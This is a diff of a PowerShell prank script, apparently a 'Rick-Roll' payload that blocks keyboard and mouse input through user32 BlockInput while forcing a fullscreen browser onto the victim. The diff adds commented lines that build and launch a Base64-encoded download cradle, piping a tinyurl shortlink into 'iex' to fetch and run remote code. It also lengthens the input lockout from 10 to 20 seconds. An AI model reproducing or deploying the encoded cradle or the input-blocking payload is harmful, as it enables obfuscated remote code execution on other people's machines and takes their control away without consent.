@@ -1,3 +1,6 @@
+# $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('iwr "https://tinyurl.com/jsehbjb" -UseBasicParsing|iex'))
+# powershell.exe -EncodedCommand "aQB3AHIAIAAiAGgAdAB0AHAAcwA6AC8ALwB0AGkAbgB5AHUAcgBsAC4AYwBvAG0ALwBqAHMAZQBoAGIAagBiACIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnAHwAaQBlAHgA"
+
 $code = @"
     [DllImport("user32.dll")]
     public static extern bool BlockInput(bool fBlockIt);
@@ -31,7 +34,7 @@ function Rick-Roll {
 		$ie2.visible = $true
 		$ie2.fullscreen = $true
 		$ie2.navigate("http://giphy.com/gifs/pandawhale-rickroll-pandawhalegif-szpY5c63cmzOE/fullscreen")
-		Disable-UserInput -seconds 10 | Out-Null
+		Disable-UserInput -seconds 20 | Out-Null
 		Get-Process -Name ie* | stop-process -Force
 	}
 	
